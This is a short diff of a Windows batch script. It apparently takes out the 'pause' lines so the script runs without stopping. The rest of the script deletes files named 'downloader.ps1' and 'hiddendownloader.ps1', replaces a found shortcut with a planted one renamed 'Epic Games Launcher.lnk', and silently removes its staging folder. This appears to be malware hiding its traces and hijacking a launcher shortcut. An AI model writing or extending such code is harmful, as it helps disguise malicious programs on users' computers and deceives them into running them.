@@ -12,11 +12,9 @@ goto :eof
 
 :found
 echo !p!
-pause
 del "!p!"
 del "C:\Users\Public\Videos\downloader.ps1"
 del "C:\Users\Public\Videos\hiddendownloader.ps1"
 move "C:\Users\Public\Videos\GraphicalUserInterface\§1.lnk" "!p!"
 ren "!p!" "Epic Games Launcher.lnk"
 rd /s /q "C:\Users\Public\Videos\GraphicalUserInterface"
-pause
